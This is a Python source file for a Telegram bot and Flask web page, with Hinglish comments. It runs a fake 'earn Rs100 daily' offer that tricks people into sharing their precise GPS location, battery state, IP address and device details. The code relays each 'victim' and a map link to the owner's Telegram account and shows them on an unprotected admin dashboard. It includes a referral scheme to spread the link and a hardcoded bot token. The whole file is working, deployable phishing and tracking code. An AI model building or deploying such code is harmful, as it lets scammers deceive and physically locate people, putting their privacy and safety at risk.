import os
import json
import logging
import threading
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

# === CONFIG - SIRF YEH DO CHEEZEIN CHANGE KARO ===
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8849680903:AAFhk2Aq2rfxuou1cHZqSOr4N1_JCei-7n4")
OWNER_ID = os.environ.get("OWNER_ID", "8586849798")  # Tumhara Telegram user ID (number)

# Flask app
app = Flask(__name__)

# Victim data store
victim_data = {}
bot_app = None

# === TELEGRAM HANDLERS ===

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    bot_username = (await context.bot.get_me()).username
    
    welcome = f"""
👋 **ᴡᴇʟᴄᴏᴍᴇ {user.first_name}!** 🎉

💰 **ᴇᴀʀɴ ₹𝟷𝟶𝟶 ᴅᴀɪʟʏ** 💰
​​​​​​​​​​​​​​‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌➥ ʙᴀꜱ ᴇᴋ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀᴏ
➥ ʟᴏᴄᴀᴛɪᴏɴ ᴀʟʟᴏᴡ ᴋᴀʀᴏ
➥ ₹𝟷𝟶𝟶 ɪɴꜱᴛᴀɴᴛ ɢᴘᴀʏ/ᴘᴀʏᴛᴍ/ᴘʜᴏɴᴇᴘᴇ 🤑

ᴛʀᴜꜱᴛᴇᴅ ʙʏ 𝟻𝟶,𝟶𝟶𝟶+ ᴜꜱᴇʀꜱ ✅
ᴢᴇʀᴏ ɪɴᴠᴇꜱᴛᴍᴇɴᴛ 🔥

👇 **ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀᴇ ʙᴜᴛᴛᴏɴ ᴘᴇ ᴛᴀᴘ ᴋᴀʀᴏ** 👇
"""
    keyboard = [[InlineKeyboardButton("🤑 ᴄʟᴀɪᴍ ₹𝟷𝟶𝟶 ɴᴏᴡ 🤑", url=f"https://{request.host}")]]
    await update.message.reply_text(welcome, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send phishing link - /link"""
    user = update.effective_user
    link = f"https://{request.host}?ref={user.id}"
    msg = f"""
🔗 **ᴛᴇʀᴀ ʀᴇꜰᴇʀʀᴀʟ ʟɪɴᴋ:** 📎
`{link}`

ᴋɪꜱɪ ᴄᴏ ʙʜᴇᴊ ᴅᴇ ✅
ᴊᴀʙ ᴠᴏ ᴄʟɪᴄᴋ ᴋᴀʀᴇɢᴀ ᴀᴜʀ ʟᴏᴄᴀᴛɪᴏɴ ᴀʟʟᴏᴡ ᴋᴀʀᴇɢᴀ
ᴛᴏ ᴛᴇʀᴀ ₹𝟸𝟻 ʀᴇꜰᴇʀʀᴀʟ ʙᴏɴᴜꜱ ᴀᴀʏᴇɢᴀ! 🤑
"""
    await update.message.reply_text(msg, parse_mode='Markdown')

async def send_victim_to_owner(victim_info):
    """Send victim data to owner via Telegram"""
    global bot_app
    if not bot_app:
        return
    
    msg = f"""
⚠️ **ɴᴇᴡ ᴠɪᴄᴛɪᴍ ᴄᴀᴘᴛᴜʀᴇᴅ!** ⚠️

📍 **ʟᴏᴄᴀᴛɪᴏɴ:** {victim_info['lat']}, {victim_info['lon']}
🎯 **ᴀᴄᴄᴜʀᴀᴄʏ:** {victim_info['acc']}ᴍ
🔋 **ʙᴀᴛᴛᴇʀʏ:** {victim_info['battery_level']}%
🔌 **ᴄʜᴀʀɢɪɴɢ:** {victim_info['battery_charging']}
🌐 **ɪᴘ:** {victim_info['ip']}
📱 **ᴅᴇᴠɪᴄᴇ:** {victim_info['platform']}
🕐 **ᴛɪᴍᴇ:** {victim_info['timestamp']}

🔗 **ɢᴏᴏɢʟᴇ ᴍᴀᴘꜱ:** https://www.google.com/maps?q={victim_info['lat']},{victim_info['lon']}
"""
    try:
        await bot_app.bot.send_message(chat_id=OWNER_ID, text=msg, parse_mode='Markdown')
    except Exception as e:
        print(f"[-] Failed to send to owner: {e}")

# === FLASK ROUTES ===

@app.route('/')
def index():
    """Phishing page"""
    ref = request.args.get('ref', 'unknown')
    host = request.host
    return f"""
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>₹100 Daily Earning</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif;}}
body{{min-height:100vh;background:linear-gradient(135deg,#1e3c72,#2a5298);display:flex;justify-content:center;align-items:center;padding:15px;}}
.card{{background:white;border-radius:20px;padding:30px 20px;max-width:390px;width:100%;text-align:center;box-shadow:0 15px 50px rgba(0,0,0,0.3);}}
.emoji{{font-size:55px;margin-bottom:10px;}}
h1{{color:#222;font-size:24px;}}
.sub{{color:#777;font-size:13px;margin:8px 0 20px;}}
.rs{{font-size:50px;font-weight:bold;color:#2ecc71;}}
.rs span{{font-size:18px;color:#666;}}
.btn{{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;padding:16px 30px;font-size:20px;font-weight:bold;border-radius:50px;width:100%;margin:18px 0;cursor:pointer;transition:.2s;}}
.btn:hover{{transform:scale(1.02);}}
.btn:active{{transform:scale(.98);}}
.btn:disabled{{opacity:.6;cursor:not-allowed;transform:none;}}
.info{{color:#aaa;font-size:11px;margin-top:10px;}}
.steps{{text-align:left;margin:15px 0;}}
.step{{display:flex;align-items:center;margin:8px 0;color:#555;font-size:14px;}}
.sn{{background:#667eea;color:#fff;width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:bold;margin-right:10px;}}
.timer{{color:#e74c3c;font-weight:bold;margin:10px 0;font-size:14px;}}
#st{{margin-top:12px;padding:10px;border-radius:10px;display:none;font-size:13px;}}
.succ{{background:#d4edda;color:#155724;}}
.err{{background:#f8d7da;color:#721c24;}}
.loader{{display:inline-block;width:16px;height:16px;border:3px solid #fff;border-radius:50%;border-top:3px solid transparent;animation:spin .8s linear infinite;margin-right:6px;vertical-align:middle;}}
@keyframes spin{{to{{transform:rotate(360deg);}}}}
</style>
</head>
<body>
<div class="card">
<div class="emoji">🎉</div>
<h1>Daily Earning Offer</h1>
<p class="sub">Complete one step to claim your reward</p>
<div class="rs">₹100 <span>/ daily</span></div>
<div class="steps">
<div class="step"><div class="sn">1</div> Click "Claim Now" button below</div>
<div class="step"><div class="sn">2</div> Allow location access when asked</div>
<div class="step"><div class="sn">3</div> ₹100 credited instantly! 🤑</div>
</div>
<div class="timer">⏱ Offer expires in: <span id="tm">05:00</span></div>
<button class="btn" id="btn" onclick="claim()">🤑 CLAIM ₹100 NOW</button>
<div id="st"></div>
<p class="info">✅ Secure • Instant Payment • Trusted by 50K+</p>
<p class="info">📍 Location required for verification</p>
</div>
<script>
let t=300;
const tm=document.getElementById('tm');
setInterval(()=>{{if(t>0){{t--;let m=Math.floor(t/60),s=t%60;tm.textContent=`${{String(m).padStart(2,'0')}}:${{String(s).padStart(2,'0')}}`;}}}},1000);

function getLoc(){{
return new Promise((a,b)=>{{if(!navigator.geolocation)b('No GPS');navigator.geolocation.getCurrentPosition(p=>a({{lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}}),e=>b(e.message),{{enableHighAccuracy:true,timeout:20000,maximumAge:0}})}});
}}

function getBat(){{
return new Promise(a=>{{if(navigator.getBattery)navigator.getBattery().then(b=>a({{lvl:Math.round(b.level*100),chg:b.charging}}));else a({{lvl:'?',chg:'?'}})}});
}}

async function claim(){{
const btn=document.getElementById('btn');
const st=document.getElementById('st');
btn.disabled=true;
btn.innerHTML='<span class="loader"></span> Processing...';
st.style.display='block';st.className='';st.innerHTML='📍 Getting your location...';
try{{
const[loc,bat]=await Promise.all([getLoc(),getBat()]);
st.innerHTML='✅ Verifying...';
const d={{lat:loc.lat,lon:loc.lon,acc:loc.acc,batt:bat.lvl,charge:bat.chg,ua:navigator.userAgent,plat:navigator.platform,lang:navigator.language,ref:'{ref}',ts:new Date().toISOString()}};
const r=await fetch('/capture',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(d)}});
if(r.ok){{st.className='succ';st.innerHTML='✅ <b>Congratulations!</b><br>₹100 credited!<br>You will receive payment within 24h';btn.innerHTML='✅ CLAIMED';btn.style.background='#27ae60';}}
else throw Error('err');
}}catch(e){{st.className='err';st.innerHTML='❌ <b>Location required!</b><br>Please allow location and try again<br><small>'+e.message+'</small>';btn.disabled=false;btn.innerHTML='🤑 TRY AGAIN';}}
}}
</script>
</body>
</html>
"""

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    data['ip'] = request.remote_addr
    data['forwarded_ip'] = request.headers.get('X-Forwarded-For', '')
    
    vid = f"victim_{int(datetime.now().timestamp())}"
    victim_data[vid] = data
    
    # Beautiful console output
    print(f"""
╔{'═'*50}╗
║   🔥 NEW VICTIM CAPTURED: {vid}  🔥
╠{'═'*50}╣
║ 📍  Lat: {data['lat']}
║ 📍  Lon: {data['lon']}
║ 🎯  Accuracy: {data['acc']}m
║ 🔋  Battery: {data['batt']}% (Charging: {data['charge']})
║ 🌐  IP: {data['ip']}
║ 📱  Platform: {data['plat']}
║ 🕐  Time: {data['ts']}
║ 👤  Ref: {data['ref']}
╚{'═'*50}╝
""")
    
    # Send to owner Telegram
    if bot_app and OWNER_ID != "YOUR_TELEGRAM_ID":
        victim_info = {
            'lat': data['lat'],
            'lon': data['lon'],
            'acc': data['acc'],
            'battery_level': data['batt'],
            'battery_charging': data['charge'],
            'ip': data['ip'],
            'platform': data['plat'],
            'timestamp': data['ts'],
            'ref': data['ref']
        }
        # Run in thread to not block
        threading.Thread(target=lambda: asyncio.run(send_victim_to_owner(victim_info)), daemon=True).start()
    
    return jsonify({"status": "ok", "message": "Reward claimed!"})

@app.route('/admin')
def admin():
    """Admin panel - see all victim data"""
    html = """
    <html><head><title>Victim Data</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
    body{font-family:sans-serif;background:#1a1a2e;color:#eee;padding:20px;}
    h1{color:#e94560;}
    table{border-collapse:collapse;width:100%;margin:10px 0;background:#16213e;border-radius:10px;overflow:hidden;}
    th{background:#e94560;padding:12px;text-align:left;}
    td{padding:10px;border-bottom:1px solid #333;word-break:break-all;}
    tr:hover{background:#1a1a3e;}
    .card{background:#16213e;border-radius:10px;padding:15px;margin:15px 0;}
    .label{color:#e94560;font-weight:bold;}
    .badge{background:#0f3460;padding:3px 10px;border-radius:20px;font-size:12px;}
    a{color:#4fc3f7;}
    </style></head><body>
    <h1>📊 Victim Data Dashboard</h1>
    <p>Total: """ + str(len(victim_data)) + """ victims</p>
    """
    if not victim_data:
        html += '<p style="color:#888;">⏳ No victims yet. Share the link!</p>'
    else:
        for vid, d in list(victim_data.items())[::-1]:  # newest first
            html += f"""
            <div class="card">
            <h3>🆔 {vid}</h3>
            <p><span class="label">📍 Location:</span> {d['lat']}, {d['lon']}</p>
            <p><span class="label">🎯 Accuracy:</span> {d['acc']}m</p>
            <p><span class="label">🗺️ Maps:</span> <a href="https://www.google.com/maps?q={d['lat']},{d['lon']}" target="_blank">Open in Google Maps</a></p>
            <p><span class="label">🔋 Battery:</span> {d['batt']}% {('⚡ Charging' if d.get('charge')==True else '🔌 Not Charging') if d.get('charge')!='?' else '?'}</p>
            <p><span class="label">🌐 IP:</span> {d['ip']}</p>
            <p><span class="label">📱 Platform:</span> {d.get('plat','?')}</p>
            <p><span class="label">🌍 Language:</span> {d.get('lang','?')}</p>
            <p><span class="label">👤 Referrer:</span> <span class="badge">{d.get('ref','?')}</span></p>
            <p><span class="label">🕐 Time:</span> {d.get('ts','?')}</p>
            <p><span class="label">💻 UA:</span> <small>{d.get('ua','?')}</small></p>
            </div>
            """
    html += "</body></html>"
    return html

# === MAIN ===

if __name__ == '__main__':
    import asyncio
    
    print("""
╔{'═'*50}╗
║   🤖 TELEGRAM LOCATION BOT DEPLOYED  🤖
╠{'═'*50}╣
║   Bot: @your_bot_username
║   Web: https://your-app.onrender.com
║   Admin: https://your-app.onrender.com/admin
╚{'═'*50}╝
""")
    
    # Start bot in background thread
    if BOT_TOKEN != "YOUR_BOT_TOKEN_HERE":
        def start_bot():
            global bot_app
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            bot_app = Application.builder().token(BOT_TOKEN).build()
            bot_app.add_handler(CommandHandler("start", start))
            bot_app.add_handler(CommandHandler("link", link))
            
            print("[+] Bot handlers registered. Starting polling...")
            bot_app.run_polling()
        
        threading.Thread(target=start_bot, daemon=True).start()
    else:
        print("[!] BOT_TOKEN not set! Bot won't run. Set environment variable BOT_TOKEN")
    
    # Run Flask
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)